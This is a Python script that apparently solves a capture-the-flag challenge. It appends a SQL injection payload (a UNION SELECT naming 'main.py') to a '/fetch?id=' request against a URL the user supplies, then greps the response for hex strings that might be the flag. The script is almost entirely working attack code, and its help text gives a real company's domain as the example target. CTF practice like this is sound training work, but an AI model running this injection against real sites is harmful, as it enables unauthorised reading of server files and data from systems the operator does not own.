import argparse
import requests
import re


def parse_args():
    parser = argparse.ArgumentParser(description="Arguments")
    parser.add_argument("--url", help="Example: tesla.com", required=True)
    return parser.parse_args()


def get_flag0(url):
    full_url = f"https://{url}/fetch?id=4"
    sql_query = " UNION select 'main.py'"
    target = full_url + sql_query
    try:
        response = requests.get(target, timeout=10)
        
        if response.status_code == 200:
            # Regex pattern to find hex strings (0xABC123, a1b2c3, etc.)
            hex_pattern = r'\b(?:0x)?[0-9a-fA-F]+\b'
            lines_with_hex = []

            # Process each line of the response text
            for line in response.text.splitlines():
                if re.search(hex_pattern, line):  # Check if hex pattern exists in line
                    lines_with_hex.append(line.strip())

            return lines_with_hex
        else:
            print(f"Request failed with status code: {response.status_code}")
            return []
    except requests.RequestException as e:
        print(f"Error fetching URL: {e}")
        return []
    


def main():
    args = parse_args()
    print(f"URL {args.url}")
    hex_strings = get_flag0(args.url)
    
    if hex_strings:
        print("Hex strings found, here might be a flag:")
        print(hex_strings)
    else:
        print("No hex strings found == No flag.")

if __name__ == "__main__":
    main()
